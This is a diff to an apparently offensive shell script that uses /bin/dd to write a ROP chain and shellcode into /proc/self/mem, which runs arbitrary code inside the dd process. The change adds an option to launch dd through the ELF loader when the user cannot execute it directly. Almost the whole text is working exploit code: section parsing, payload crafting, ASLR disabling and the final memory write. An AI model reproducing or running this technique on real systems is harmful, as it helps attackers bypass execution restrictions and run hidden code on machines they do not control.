@@ -6,6 +6,10 @@ filename=/bin/dd
 # Then in gdb just use `set *(short*)$pc=0x9090' and you will be able to `si'
 if [ -z "$DEBUG" ]; then DEBUG=0; fi
 
+# If /bin/dd is not executable by your user you may try to run it through the
+# the loader (typically ld).
+if [ -z "$USE_INTERP" ]; then USE_INTERP=0; fi
+
 # Endian conversion
 endian()
 {
@@ -417,15 +421,6 @@ craft_stack()
 }
 craft_payload2()
 {
-    # Which interpreter (loader) does this dd need? (we've to parse its headers)
-    local interp_off=$(search_section file $filename .interp)
-    local interp_size=$(echo $interp_off | cut -d' ' -f2)
-    interp_off=$(echo $interp_off | cut -d' ' -f1)
-    local interp=$(tail -c +$(($interp_off + 1)) $filename |\
-                   head -c $((interp_size - 1)))
-    local interp_addr=$((interp_off + $((0x$dd_base))))
-    interp_addr=$(printf %016x $interp_addr)
-
     local sc=""
     # Load binary
     local loadbinsc=$(shellcode_loader bin)
@@ -471,7 +466,7 @@ craft_payload2()
     if [ $DEBUG -eq 1 ]; then sc="ebfe"$sc; fi
 
     local sc_len=$(printf "%016x" $((${#sc} / 2)))
-    echo -n $sc_len $sc$writebin$stack $interp
+    echo -n $sc_len $sc$writebin$stack
 }
 
 find_gadget()
@@ -568,16 +563,26 @@ then
     setopt KSH_ARRAYS
 fi
 
+# Which interpreter (loader) does this dd need? (we've to parse its headers)
+interp_off=$(search_section file $filename .interp)
+interp_size=$(echo $interp_off | cut -d' ' -f2)
+interp_off=$(echo $interp_off | cut -d' ' -f1)
+interp=$(tail -c +$(($interp_off + 1)) $filename | head -c $((interp_size - 1)))
+if [ $USE_INTERP -eq 1 ]; then interp_=$interp; else interp_=""; fi
+
 # dd's mappings
-dd_maps=$($noaslr $filename if=/proc/self/maps 2> /dev/null)
+dd_maps=$($noaslr $interp_ $filename if=/proc/self/maps 2> /dev/null)
 # Where is the dd binary loaded without ASLR
 dd_base=0000$(echo "$dd_maps" | grep -w $(readlink -f $filename) |\
               head -n1 | cut -d'-' -f1)
 
+# Address of the string with the path to the loader
+interp_addr=$(printf %016x $((interp_off + $((0x$dd_base)))))
+
+
 ## 2nd payload: Shellcode, needed parts of the binary & stack's initial content
 payload2=$(craft_payload2 "$@")
 sc_len=$(echo $payload2 | cut -d' ' -f1)
-interp=$(echo $payload2 | cut -d' ' -f3)
 payload2=$(echo $payload2 | cut -d' ' -f2)
 
 # Find path to the libc
@@ -613,5 +618,6 @@ write_to_addr=$(((0x$write_to_addr - 1) & (~0xfff)))
 payload=$(printf %s "$rop$payload2" | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
 # I'm going in, wish me luck...
 printf %b "$payload" |\
-(sleep .1; $noaslr env -i $filename bs=$rop_len count=1 of=/proc/self/mem \
-seek=$write_to_addr conv=notrunc oflag=seek_bytes iflag=fullblock) 2>&1
+(sleep .1; $noaslr env -i $interp_ $filename bs=$rop_len count=1    \
+of=/proc/self/mem seek=$write_to_addr conv=notrunc oflag=seek_bytes \
+iflag=fullblock) 2>&1
